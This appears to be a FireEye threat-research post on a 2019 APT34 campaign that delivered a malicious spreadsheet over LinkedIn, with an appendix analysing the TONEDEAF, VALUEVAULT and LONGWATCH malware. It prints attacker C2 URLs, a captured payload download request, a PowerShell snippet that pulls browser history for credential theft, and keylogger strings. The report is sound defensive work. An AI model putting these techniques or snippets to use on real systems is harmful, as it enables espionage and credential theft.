Iran has a critical\nneed for strategic intelligence and is likely to fill this gap by conducting espionage\nagainst decision makers and key organizations that may have information that furthers\nIran's economic and national security goals. The identification of new malware and the\ncreation of additional infrastructure to enable such campaigns highlights the increased\ntempo of these operations in support of Iranian interests.\n\n## FireEye Identifies Phishing Campaign\n\nIn late June 2019, FireEye identified a phishing campaign conducted by APT34, an\nIranian-nexus threat actor. Three key attributes caught our eye with this particular\ncampaign:\n\n1. Masquerading as a member of Cambridge University to gain victims’ trust to open\n\nmalicious documents,\n2. The usage of LinkedIn to deliver malicious documents,\n3. The addition of three new malware families to APT34’s arsenal.\n\nFireEye’s platform successfully thwarted this attempted intrusion, stopping a new\nmalware variant dead in its tracks. Additionally, with the assistance of our FireEye Labs\nAdvanced Reverse Engineering (FLARE), Intelligence, and Advanced Practices teams,\nwe identified three new malware families and a reappearance of PICKPOCKET, malware\nexclusively observed in use by APT34. The new malware families, which we will\nexamine later in this post, show APT34 relying on their PowerShell development\ncapabilities, as well as trying their hand at Golang.\n\nAPT34 is an Iran-nexus cluster of cyber espionage activity that has been active since at\nleast 2014. They use a mix of public and non-public tools to collect strategic information\nthat would benefit nation-state interests pertaining to geopolitical and economic needs.\nAPT34 aligns with elements of activity reported as OilRig and Greenbug, by various\nsecurity researchers. This threat group has conducted broad targeting across a variety of\nindustries operating in the Middle East; however, we believe APT34's strongest interest\nis gaining access to financial, energy, and government entities.\n\nAdditional research on APT34 can be found in this [FireEye blog post, this](https://www.fireeye.com/blog/threat-research/2017/12/targeted-attack-in-middle-east-by-apt34.html) CERT-OPMD\npost, and this [Cisco post.](https://blog.talosintelligence.com/2018/11/dnspionage-campaign-targets-middle-east.html)\n\n\n-----\n\n[Managed Defense also initiated a Community Protection Event (CPE) titled Geopolitical](https://www.fireeye.com/solutions/managed-defense.html)\nSpotlight: Iran.” This CPE was created to ensure our customers are updated with new\ndiscoveries, activity and detection efforts related to this campaign, along with other\nrecent activity from Iranian-nexus threat actors to include APT33, which is mentioned in\nthis [updated FireEye blog post.](https://www.fireeye.com/blog/threat-research/2018/12/overruled-containing-a-potentially-destructive-adversary.html)\n\n## Industries Targeted\n\nThe activities observed by Managed Defense, and described in this post, were primarily\ntargeting the following industries:\n\nEnergy and Utilities\nGovernment\nOil and Gas\n\n## Utilizing Cambridge University to Establish Trust\n\nOn June 19, 2019, FireEye’s Managed Defense Security Operations Center received an\nexploit detection alert on one of our FireEye Endpoint Security appliances. The offending\napplication was identified as Microsoft Excel and was stopped immediately by FireEye\nEndpoint Security’s ExploitGuard engine. ExploitGuard is our behavioral monitoring,\ndetection, and prevention capability that monitors application behavior, looking for\nvarious anomalies that threat actors use to subvert traditional detection mechanisms.\nOffending applications can subsequently be sandboxed or terminated, preventing an\nexploit from reaching its next programmed step.\n\nThe Managed Defense SOC analyzed the alert and identified a malicious file named\nSystem.doc (MD5: b338baa673ac007d7af54075ea69660b), located in C:\\Users\\\n<user_name>\\.templates. The file System.doc is a Windows Portable Executable (PE),\ndespite having a \"doc\" file extension. FireEye identified this new malware family as\nTONEDEAF.\n\nA backdoor that communicates with a single command and control (C2) server using\nHTTP GET and POST requests, TONEDEAF supports collecting system information,\nuploading and downloading of files, and arbitrary shell command execution. When\nexecuted, this variant of TONEDEAF wrote encrypted data to two temporary files –\ntemp.txt and temp2.txt – within the same directory of its execution. We explore additional\ntechnical details of TONEDEAF in the malware appendix of this post.\n\nRetracing the steps preceding exploit detection, FireEye identified that System.doc was\ndropped by a file named ERFT-Details.xls. Combining endpoint- and network-visibility,\nwe were able to correlate that ERFT-Details.xls originated from the URL http://www.camresearch-ac[.]com/Documents/ERFT-Details.xls. Network evidence also showed the\naccess of a LinkedIn message directly preceding the spreadsheet download.\n\nManaged Defense reached out to the impacted customer’s security team, who confirmed\nthe file was received via a LinkedIn message. The targeted employee conversed with\n\"Rebecca Watts\", allegedly employed as \"Research Staff at University of Cambridge\".\n\n\n-----\n\nThe conversation with Ms. Watts, provided in Figure 1, began with the solicitation of\nresumes for potential job opportunities.\n\nFigure 1: Screenshot of LinkedIn message asking to download TONEDEAF\n\nThis is not the first time we’ve seen APT34 utilize academia and/or job offer\nconversations in their various campaigns. These conversations often take place on\nsocial media platforms, which can be an effective delivery mechanism if a targeted\norganization is focusing heavily on e-mail defenses to prevent intrusions.\n\nFireEye examined the original file ERFT-Details.xls, which was observed with at least\ntwo unique MD5 file hashes:\n\n96feed478c347d4b95a8224de26a1b2c\ncaf418cbf6a9c4e93e79d4714d5d3b87\n\nA snippet of the VBA code, provided in Figure 2, creates System.doc in the target\ndirectory from base64-encoded text upon opening.\n\n\n-----\n\nFigure 2: Screenshot of VBA code from System.doc\n\nThe spreadsheet also creates a scheduled task named \"windows update check\" that\nruns the file C:\\Users\\<user_name>\\.templates\\System Manager.exe every minute. Upon\nclosing the spreadsheet, a final VBA function will rename System.doc to System\nManager.exe. Figure 3 provides a snippet of VBA code that creates the scheduled task,\nclearly obfuscated to avoid simple detection.\n\nFigure 3: Additional VBA code from System.doc\n\nUpon first execution of TONEDEAF, FireEye identified a callback to the C2 server\nofflineearthquake[.]com over port 80.\n\n## The FireEye Footprint: Pivots and Victim Identification\n\n\n-----\n\nAfter identifying the usage of offlineearthquake[.]com as a potential C2 domain,\nFireEye’s Intelligence and Advanced Practices teams performed a wider search across\nour global visibility. FireEye’s Advanced Practices and Intelligence teams were able to\nidentify additional artifacts and activity from the APT34 actors at other victim\norganizations. Of note, FireEye discovered two additional new malware families hosted\nat this domain, VALUEVAULT and LONGWATCH. We also identified a variant of\nPICKPOCKET, a browser credential-theft tool FireEye has been tracking since May\n2018, hosted on the C2.\n\nRequests to the domain offlineearthquake[.]com could take multiple forms, depending on\nthe malware’s stage of installation and purpose. Additionally, during installation, the\nmalware retrieves the system and current user names, which are used to create a threecharacter “sys_id”. This value is used in subsequent requests, likely to track infected\ntarget activity. URLs were observed with the following structures:\n\nhxxp[://]offlineearthquake[.]com/download?id=<sys_id>&n=000\nhxxp[://]offlineearthquake[.]com/upload?id=<sys_id>&n=000\nhxxp[://]offlineearthquake[.]com/file/<sys_id>/<executable>?id=<cmd_id>&h=000\nhxxp[://]offlineearthquake[.]com/file/<sys_id>/<executable>?id=<cmd_id>&n=000\n\nThe first executable identified by FireEye on the C2 was WinNTProgram.exe (MD5:\n021a0f57fe09116a43c27e5133a57a0a), identified by FireEye as LONGWATCH.\nLONGWATCH is a keylogger that outputs keystrokes to a log.txt file in the Window’s\ntemp folder. Further information regarding LONGWATCH is detailed in the Malware\nAppendix section at the end of the post.\n\nFireEye Network Security appliances also detected the following being retrieved from\nAPT34 infrastructure (Figure 4).\n\nGET hxxp://offlineearthquake.com/file/<sys_id>/b.exe?id=<3char_redacted>&n=000\nUser-Agent: Mozilla/5.0 (Windows NT 6.1; Trident/7.0; rv:11.0)\nAppleWebKit/537.36 (KHTML, like Gecko)\nHost: offlineearthquake[.]com\nProxy-Connection: Keep-Alive Pragma: no-cache HTTP/1.1\n\nFigure 4: Snippet of HTTP traffic retrieving VALUEVAULT; detected by FireEye Network\nSecurity appliance\n\nFireEye identifies b.exe (MD5: 9fff498b78d9498b33e08b892148135f) as VALUEVAULT.\n\nVALUEVAULT is a Golang compiled version of the \"Windows Vault Password Dumper\"\nbrowser credential theft tool from Massimiliano Montoro, the developer of Cain & Abel.\n\nVALUEVAULT maintains the same functionality as the original tool by allowing the\noperator to extract and view the credentials stored in the Windows Vault. Additionally,\nVALUEVAULT will call Windows PowerShell to extract browser history in order to match\nbrowser passwords with visited sites. Further information regarding VALUEVAULT can\nbe found in the appendix below.\n\n\n-----\n\nFurther pivoting from FireEye appliances and internal data sources yielded two\nadditional files, PE86.dll (MD5: d8abe843db508048b4d4db748f92a103) and PE64.dll\n(MD5: 6eca9c2b7cf12c247032aae28419319e). These files were analyzed and\ndetermined to be 64- and 32-bit variants of the malware PICKPOCKET, respectively.\n\nPICKPOCKET is a credential theft tool that dumps the user's website login credentials\nfrom Chrome, Firefox, and Internet Explorer to a file. This tool was previously observed\nduring a Mandiant incident response in 2018 and, to date, solely utilized by APT34.\n\n## Conclusion\n\nThe activity described in this blog post presented a well-known Iranian threat actor\nutilizing their tried-and-true techniques to breach targeted organizations. Luckily, with\nFireEye’s platform in place, our Managed Defense customers were not impacted.\nFurthermore, upon the blocking of this activity, FireEye was able to expand upon the\nobserved indicators to identify a broader campaign, as well as the use of new and old\nmalware.\n\nWe suspect this will not be the last time APT34 brings new tools to the table. Threat\nactors are often reshaping their TTPs to evade detection mechanisms, especially if the\ntarget is highly desired. For these reasons, we recommend organizations remain vigilant\nin their defenses, and remember to view their environment holistically when it comes to\ninformation security.\n\n## Malware Appendix\n\n### TONEDEAF\n\nTONEDEAF is a backdoor that communicates with Command and Control servers using\nHTTP or DNS. Supported commands include system information collection, file upload,\nfile download, and arbitrary shell command execution. Although this backdoor was\ncoded to be able to communicate with DNS requests to the hard-coded Command and\nControl server, c[.]cdn-edge-akamai[.]com, it was not configured to use this functionality.\nFigure 5 provides a snippet of the assembly CALL instruction of dns_exfil. The creator\nlikely made this as a means for future DNS exfiltration as a plan B.\n\n\n-----\n\nFigure 5: Snippet of code from TONEDEAF binary\n\nAside from not being enabled in this sample, the DNS tunneling functionality also\ncontains missing values and bugs that prevent it from executing properly. One such bug\ninvolves determining the length of a command response string without accounting for\nUnicode strings. As a result, a single command response byte is sent when, for example,\nthe malware executes a shell command that returns Unicode output. Additionally, within\nthe malware, an unused string contained the address 185[.]15[.]247[.]154.\n\n### VALUEVAULT\n\nVALUEVAULT is a Golang compiled version of the “Windows Vault Password Dumper”\nbrowser credential theft tool from Massimiliano Montoro, the developer of Cain & Abel.\n\nVALUEVAULT maintains the same functionality as the original tool by allowing the\noperator to extract and view the credentials stored in the Windows Vault. Additionally,\nVALUEVAULT will call Windows PowerShell to extract browser history in order to match\nbrowser passwords with visited sites. A snippet of this function is shown in Figure 6.\n\npowershell.exe /c \"function get-iehistory {. [CmdletBinding()]. param (). . $shell = New-Ob‐\nject -ComObject Shell.Application. $hist = $shell.NameSpace(34). $folder = $hist.Self. .\n$hist.Items() | . foreach {. if ($_.IsFolder) {. $siteFolder = $_.GetFolder. $siteFolder.Items()\n| . foreach {. $site = $_. . if ($site.IsFolder) {. $pageFolder = $site.GetFolder. $pageFold‐\ner.Items() | . foreach {. $visit = New-Object -TypeName PSObject -Property @{ . URL =\n$($pageFolder.GetDetailsOf($_,0)) . }. $visit. }. }. }. }. }. }. get-iehistory\n\nFigure 6: Snippet of PowerShell code from VALUEVAULT to extract browser credentials\n\nUpon execution, VALUEVAULT creates a SQLITE database file in the AppData\\Roaming\ndirectory under the context of the user account it was executed by. This file is named\nfsociety.dat and VALUEVAULT will write the dumped passwords to this in SQL format.\nThis functionality is not in the original version of the “Windows Vault Password Dumper”.\nFigure 7 shows the SQL format of the fsociety.dat file.\n\nFigure 7: SQL format of the VALUEVAULT fsociety.dat SQLite database\n\n\n-----\n\nVALUEVAULT s function names are not obfuscated and are directly reviewable in strings\nanalysis. Other developer environment variables were directly available within the binary\nas shown below. VALUEVAULT does not possess the ability to perform network\ncommunication, meaning the operators would need to manually retrieve the captured\noutput of the tool.\n\nC:/Users/<redacted>/Desktop/projects/go/src/browsers-password-cracker/new_edge.go\nC:/Users/<redacted>/Desktop/projects/go/src/browsers-password-cracker/mozila.go\nC:/Users/<redacted>/Desktop/projects/go/src/browsers-password-cracker/main.go\nC:/Users/<redacted>/Desktop/projects/go/src/browsers-password-cracker/ie.go\nC:/Users/<redacted>/Desktop/projects/go/src/browsers-password-cracker/Chrome Pass‐\nword Recovery.go\n\nFigure 8: Golang files extracted during execution of VALUEVAULT\n\n### LONGWATCH\n\nFireEye identified the binary WinNTProgram.exe\n(MD5:021a0f57fe09116a43c27e5133a57a0a) hosted on the malicious domain\nofflineearthquake[.]com. FireEye identifies this malware as LONGWATCH. The primary\nfunction of LONGWATCH is a keylogger that outputs keystrokes to a log.txt file in the\nWindows temp folder.\n\nInteresting strings identified in the binary are shown in Figure 9.\n\nGetAsyncKeyState\n>---------------------------------------------------\\n\\n\nc:\\\\windows\\\\temp\\\\log.txt\n\n[ENTER]\n\n[CapsLock]\n\n[CRTL]\n\n[PAGE_UP]\n\n[PAGE_DOWN]\n\n[HOME]\n\n[LEFT]\n\n[RIGHT]\n\n[DOWN]\n\n[PRINT]\n\n[PRINT SCREEN] (1 space)\n\n[INSERT]\n\n[SLEEP]\n\n[PAUSE]\n\\n---------------CLIPBOARD------------\\n\n\\n\\n >>> (2 spaces)\nc:\\\\windows\\\\temp\\\\log.txt\n\nFigure 9: Strings identified in a LONGWATCH binary\n\n### Detecting the Techniques\n\nFireEye detects this activity across our platforms, including named detection for\nTONEDEAF, VALUEVAULT, and LONGWATCH.
